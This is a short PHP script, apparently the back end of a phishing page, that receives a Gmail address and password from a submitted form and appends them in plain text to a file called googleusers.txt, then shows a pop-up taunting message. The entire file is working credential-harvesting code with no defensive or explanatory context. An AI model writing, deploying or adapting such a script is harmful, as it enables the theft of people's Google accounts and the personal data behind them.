<?php
$gmail = $_POST['gmail'];
$password = $_POST['password'];

$data = "Email : " . $gmail . "\n" .
        "Password : " . $password . "\n";

$response = file_put_contents(
    __DIR__ . '/googleusers.txt',
    $data,
    FILE_APPEND | LOCK_EX
);  

if ($response === false) {
    echo "<script>alert('error')</script>";
} else {
    echo "<script>alert('mcha lik acc bu MYX700')</script>";
}
?>
